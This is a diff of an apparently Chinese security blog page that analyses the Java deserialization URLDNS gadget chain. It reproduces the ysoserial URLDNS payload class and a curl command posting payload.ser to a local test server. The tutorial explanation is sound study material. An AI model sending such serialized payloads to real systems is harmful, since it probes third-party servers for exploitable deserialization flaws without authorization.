-        h <span class="token operator">+=</span> addr<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-        <span class="token class-name">String</span> host <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>host <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
-            h <span class="token operator">+=</span> host<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+    // Generate the host part.
+    InetAddress addr = getHostAddress(u);//获取地址
+    if (addr != null) &#123;
+        h += addr.hashCode();
+    &#125; else &#123;
+        String host = u.getHost();
+        if (host != null)
+            h += host.toLowerCase().hashCode();
+    &#125;
 
-    <span class="token comment">// Generate the file part.</span>
-    <span class="token class-name">String</span> file <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
-        h <span class="token operator">+=</span> file<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Generate the file part.
+    String file = u.getFile();
+    if (file != null)
+        h += file.hashCode();
 
-    <span class="token comment">// Generate the port part.</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>u<span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//获取端口</span>
-        h <span class="token operator">+=</span> <span class="token function">getDefaultPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">else</span>
-        h <span class="token operator">+=</span> u<span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Generate the port part.
+    if (u.getPort() == -1)//获取端口
+        h += getDefaultPort();
+    else
+        h += u.getPort();
 
-    <span class="token comment">// Generate the ref part.</span>
-    <span class="token class-name">String</span> ref <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>ref <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
-        h <span class="token operator">+=</span> ref<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    // Generate the ref part.
+    String ref = u.getRef();
+    if (ref != null)
+        h += ref.hashCode();
 
-    <span class="token keyword">return</span> h<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    return h;
+&#125;
+</code></pre>
 <p>由代码可知，java会先获取protocol,所以我们在构造利用链的时候，<strong>需要将我们接收URLDNS的地址加上相应的协议(如http://)</strong></p>
 <h2 id="getHostAddress"><a href="#getHostAddress" class="headerlink" title="getHostAddress()"></a>getHostAddress()</h2><p>我们继续跟进<code>getHostAddress(u);</code></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">synchronized</span> <span class="token class-name">InetAddress</span> <span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token class-name">URL</span> u<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>u<span class="token punctuation">.</span>hostAddress <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token comment">//先判断该URL的hostAddress属性是否已经有值了</span>
-        <span class="token keyword">return</span> u<span class="token punctuation">.</span>hostAddress<span class="token punctuation">;</span><span class="token comment">//如果已有值，直接返回</span>
+<pre><code class="java">protected synchronized InetAddress getHostAddress(URL u) &#123;
+    if (u.hostAddress != null)//先判断该URL的hostAddress属性是否已经有值了
+        return u.hostAddress;//如果已有值，直接返回
 
-    <span class="token class-name">String</span> host <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取Host</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>host <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> host<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-            u<span class="token punctuation">.</span>hostAddress <span class="token operator">=</span> <span class="token class-name">InetAddress</span><span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取IP地址，并把值赋给URL的hostAddress</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnknownHostException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> se<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token keyword">return</span> u<span class="token punctuation">.</span>hostAddress<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    String host = u.getHost();//获取Host
+    if (host == null || host.equals(&quot;&quot;)) &#123;
+        return null;
+    &#125; else &#123;
+        try &#123;
+            u.hostAddress = InetAddress.getByName(host);//获取IP地址，并把值赋给URL的hostAddress
+        &#125; catch (UnknownHostException ex) &#123;
+            return null;
+        &#125; catch (SecurityException se) &#123;
+            return null;
+        &#125;
+    &#125;
+    return u.hostAddress;
+&#125;
+</code></pre>
 <p>从上面我们可以看到，如果程序在之前已经执行过payload(或者已经访问过我们设置的DNS)，就不会再触发第二次，因为已有缓存在<code>hostAddress</code>处。 所以我们需要提供一个<strong>没有被解析过的域名</strong>。</p>
 <h2 id="InetAddress-getByName"><a href="#InetAddress-getByName" class="headerlink" title="InetAddress.getByName()"></a>InetAddress.getByName()</h2><p>继续跟进<code>InetAddress.getByName(host)</code></p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116210657890.png" alt="image-20211116210657890"></p>
@@ -396,79 +417,80 @@
 <h2 id="getAllByName"><a href="#getAllByName" class="headerlink" title="getAllByName()"></a>getAllByName()</h2><p>一直跟进到<code>getAllByName()</code></p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211025208.png" alt="image-20211116211025208"></p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211130053.png" alt="image-20211116211130053"></p>
-<h2 id="getAllByName0"><a href="#getAllByName0" class="headerlink" title="getAllByName0()"></a>getAllByName0()</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">InetAddress</span><span class="token punctuation">[</span><span class="token punctuation">]</span> getAllByName0 <span class="token punctuation">(</span><span class="token class-name">String</span> host<span class="token punctuation">,</span> <span class="token class-name">InetAddress</span> reqAddr<span class="token punctuation">,</span> <span class="token keyword">boolean</span> check<span class="token punctuation">)</span>
-    <span class="token keyword">throws</span> <span class="token class-name">UnknownHostException</span>  <span class="token punctuation">&#123;</span>
+<h2 id="getAllByName0"><a href="#getAllByName0" class="headerlink" title="getAllByName0()"></a>getAllByName0()</h2><pre><code class="java">private static InetAddress[] getAllByName0 (String host, InetAddress reqAddr, boolean check)
+    throws UnknownHostException  &#123;
 
-    <span class="token comment">/* If it gets here it is presumed to be a hostname */</span>
-    <span class="token comment">/* Cache.get can return: null, unknownAddress, or InetAddress[] */</span>
+    /* If it gets here it is presumed to be a hostname */
+    /* Cache.get can return: null, unknownAddress, or InetAddress[] */
 
-    <span class="token comment">/* make sure the connection to the host is allowed, before we
+    /* make sure the connection to the host is allowed, before we
      * give out a hostname
-     */</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>check<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//先判断连接是否被允许</span>
-        <span class="token class-name">SecurityManager</span> security <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>security <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-            security<span class="token punctuation">.</span><span class="token function">checkConnect</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
+     */
+    if (check) &#123;//先判断连接是否被允许
+        SecurityManager security = System.getSecurityManager();
+        if (security != null) &#123;
+            security.checkConnect(host, -1);
+        &#125;
+    &#125;
 
-    <span class="token class-name">InetAddress</span><span class="token punctuation">[</span><span class="token punctuation">]</span> addresses <span class="token operator">=</span> <span class="token function">getCachedAddresses</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从缓存中查找域名对应的IP地址</span>
+    InetAddress[] addresses = getCachedAddresses(host);//从缓存中查找域名对应的IP地址
 
-    <span class="token comment">/* If no entry in cache, then do the host lookup */</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>addresses <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果缓存中没有记录</span>
-        addresses <span class="token operator">=</span> <span class="token function">getAddressesFromNameService</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> reqAddr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//发起DNS请求</span>
-    <span class="token punctuation">&#125;</span>
+    /* If no entry in cache, then do the host lookup */
+    if (addresses == null) &#123;//如果缓存中没有记录
+        addresses = getAddressesFromNameService(host, reqAddr);//发起DNS请求
+    &#125;
 
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>addresses <span class="token operator">==</span> unknown_array<span class="token punctuation">)</span>
-        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnknownHostException</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    if (addresses == unknown_array)
+        throw new UnknownHostException(host);
 
-    <span class="token keyword">return</span> addresses<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+    return addresses.clone();
+&#125;
+</code></pre>
 <p>从上述代码，我们能够发现，<code>getAddressesFromNameService()</code>就是最终发起DNS请求的方法。</p>
 <h2 id="getAddressesFromNameService"><a href="#getAddressesFromNameService" class="headerlink" title="getAddressesFromNameService()"></a>getAddressesFromNameService()</h2><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116211837716.png" alt="image-20211116211837716"></p>
 <h1 id="简易利用链分析-Java-1-8"><a href="#简易利用链分析-Java-1-8" class="headerlink" title="简易利用链分析(Java 1.8)"></a>简易利用链分析(Java 1.8)</h1><p>Java1.8和1.7虽然代码有些许区别，但是最后也是会到hash()方法，然后接下来的链都是一样的</p>
 <blockquote>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token operator">-></span>readObject
-<span class="token class-name">HashMap</span><span class="token operator">-></span>putval
-<span class="token class-name">HashMap</span><span class="token operator">-></span>hash
-URL<span class="token operator">-></span>hashCode
-<span class="token class-name">URLStreamHandler</span><span class="token operator">-></span>hashCode
-<span class="token class-name">URLStreamHandler</span><span class="token operator">-></span>getHostAddress
-    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code class="java">HashMap-&gt;readObject
+HashMap-&gt;putval
+HashMap-&gt;hash
+URL-&gt;hashCode
+URLStreamHandler-&gt;hashCode
+URLStreamHandler-&gt;getHostAddress
+    .....
+</code></pre>
 </blockquote>
 <p>此处就不演示了。</p>
-<h1 id="Ysoserial中的利用链"><a href="#Ysoserial中的利用链" class="headerlink" title="Ysoserial中的利用链"></a>Ysoserial中的利用链</h1><h2 id="巧妙的SilentURLStreamHandler"><a href="#巧妙的SilentURLStreamHandler" class="headerlink" title="巧妙的SilentURLStreamHandler"></a>巧妙的SilentURLStreamHandler</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">URLDNS</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectPayload</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>
+<h1 id="Ysoserial中的利用链"><a href="#Ysoserial中的利用链" class="headerlink" title="Ysoserial中的利用链"></a>Ysoserial中的利用链</h1><h2 id="巧妙的SilentURLStreamHandler"><a href="#巧妙的SilentURLStreamHandler" class="headerlink" title="巧妙的SilentURLStreamHandler"></a>巧妙的SilentURLStreamHandler</h2><pre><code class="java">public class URLDNS implements ObjectPayload&lt;Object&gt; &#123;
 
-        <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        public Object getObject(final String url) throws Exception &#123;
 
-                <span class="token class-name">URLStreamHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SilentURLStreamHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//avoid any DNS resolution</span>
+                URLStreamHandler handler = new SilentURLStreamHandler();//avoid any DNS resolution
 
-                <span class="token class-name">HashMap</span> ht <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-                <span class="token class-name">URL</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span> 
-                ht<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span> 
-                <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> <span class="token string">"hashCode"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                HashMap ht = new HashMap(); 
+                URL u = new URL(null, url, handler); 
+                ht.put(u, url); 
+                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);
 
-                <span class="token keyword">return</span> ht<span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
+                return ht;
+        &#125;
 
-        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
-                <span class="token class-name">PayloadRunner</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>URLDNS<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
+        public static void main(final String[] args) throws Exception &#123;
+                PayloadRunner.run(URLDNS.class, args);
+        &#125;
 
 
-        <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">SilentURLStreamHandler</span> <span class="token keyword">extends</span> <span class="token class-name">URLStreamHandler</span> <span class="token punctuation">&#123;</span>
+        static class SilentURLStreamHandler extends URLStreamHandler &#123;
 
-                <span class="token keyword">protected</span> <span class="token class-name">URLConnection</span> <span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token class-name">URL</span> u<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
-                        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-                <span class="token punctuation">&#125;</span>
+                protected URLConnection openConnection(URL u) throws IOException &#123;
+                        return null;
+                &#125;
 
-                <span class="token keyword">protected</span> <span class="token keyword">synchronized</span> <span class="token class-name">InetAddress</span> <span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token class-name">URL</span> u<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
-                <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+                protected synchronized InetAddress getHostAddress(URL u) &#123;
+                        return null;
+                &#125;
+        &#125;
+&#125;
+</code></pre>
 <p><strong>Ysoserial</strong>并没有像我们之前看到的简易利用链那样去用反射的方法在<code>hashmap.put</code>前修改hashCode的值，相反它用了一个非常聪明的办法：<strong>重写handler</strong>。</p>
 <p><code>SilentURLStreamHandler</code>继承了<code>URLStreamHandler</code>（因为后者是abstract，不能被创建instance），里面包含两个method，一个是<code>openConnection</code> 一个是<code>getHostAddress</code></p>
 <p>其中<code>getHostAddress ()</code>我们非常熟悉，复习下之前的原生态<strong>getHostAddress</strong>的内容：</p>
@@ -477,13 +499,13 @@ URL<span class="token operator">-></span>hashCode
 <h2 id="生成HashMap与URL"><a href="#生成HashMap与URL" class="headerlink" title="生成HashMap与URL"></a>生成HashMap与URL</h2><p>创建<strong>HashMap</strong>后，我们需要把URL放进hashmap中， 因为我们已经创建了一个handler，所以我们需要把handler赋给新创建的URL。</p>
 <p>在URL的<strong>constructor</strong>中，我们可以看到，<code>URLStreamHandler</code>是可以自定义的</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116214812588.png" alt="image-20211116214812588"></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span> ht <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// HashMap that will contain the URL</span>
-<span class="token class-name">URL</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// URL to use as the Key</span>
-ht<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//value可以为任何值，这里Ysoserial把value设置为了我们的URLDNS接收的网址(url)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="java">HashMap ht = new HashMap(); // HashMap that will contain the URL
+URL u = new URL(null, url, handler); // URL to use as the Key
+ht.put(u, url); //value可以为任何值，这里Ysoserial把value设置为了我们的URLDNS接收的网址(url)
+</code></pre>
 <p>在<strong>hashmap</strong>的<strong>put</strong>完成后，过程中<strong>hashCode</strong>肯定还会变化（即使在检测<strong>hashCode!=-1</strong>的步骤那里我们满足了条件），我们仍需要将他改回**-1**，以便server在执行反序列化的时候，我们的payload可以生效。</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> <span class="token string">"hashCode"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<pre><code class="java">Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);
+</code></pre>
 <h2 id="序列化时的问题"><a href="#序列化时的问题" class="headerlink" title="序列化时的问题"></a>序列化时的问题</h2><p>我们刚刚提到，Ysoserial重写了**getHostAddress()**方法，那我们序列化后的object岂不是也是用这个复写后的方法，服务器进行反序列化时就不会触发URLDNS了？</p>
 <p>Ysoserial也解释了这一点：</p>
 <blockquote>
@@ -497,8 +519,8 @@ ht<span class="token punctuation">.</span><span class="token function">put</span
 <p><strong>注意：在之前的分析中提到过，我们需要加上协议(http://)</strong></p>
 <p><strong>Serializer.java：</strong></p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116221003206.png" alt="image-20211116221003206"></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://localhost:9090/webTest1_Web_exploded/test --data-binary @payload.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<pre><code class="bash">curl http://localhost:9090/webTest1_Web_exploded/test --data-binary @payload.ser
+</code></pre>
 <p>刷新URLDNS平台后成功收到记录：</p>
 <p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/image-20211116221323622.png" alt="image-20211116221323622"></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>URLDNS</strong>利用链从<strong>HashMap</strong>入手，到URL类自身的一系列<strong>methods</strong>连成利用链，包括<strong>Ysoserial</strong>对<strong>Handler</strong>的覆写和<strong>transient</strong>的理解，都十分巧妙。</p>
@@ -523,6 +545,23 @@ ht<span class="token punctuation">.</span><span class="token function">put</span
               2022-06-09 09:43:07
             </span>
             
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/" title="Web Security">
+                        <b>#</b> Web Security
+                      </a>
+                    </span>
+                    
+                    <span class="span--category">
+                      <a href="/categories/Web-Security/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="JAVA反序列化漏洞">
+                        <b>#</b> JAVA反序列化漏洞
+                      </a>
+                    </span>
+                    
+                  </span>
+              
                   <span class="post-tags">
                     <i class="iconfont icon-tags mr-10" title="Tags"></i>
                     
